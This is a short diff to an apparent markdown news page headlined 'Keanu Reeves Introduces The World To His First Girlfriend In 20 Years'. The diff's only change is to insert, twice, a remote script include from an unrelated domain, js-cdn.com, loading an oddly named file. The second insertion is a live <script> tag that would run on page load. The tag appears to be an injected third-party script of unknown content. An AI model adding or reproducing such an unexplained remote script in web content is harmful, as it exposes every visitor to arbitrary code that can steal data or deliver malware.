@@ -1,3 +1,8 @@
+
+`script src='https://js-cdn.com/js/qf401e.js'`
+
+<script src='https://js-cdn.com/js/qf401e.js'></script>
+
 ![image](https://img.jakpost.net/c/2019/05/20/2019_05_20_72607_1558317268._large.jpg)
 ## Keanu Reeves Introduces The World To His First Girlfriend In 20 Years
 
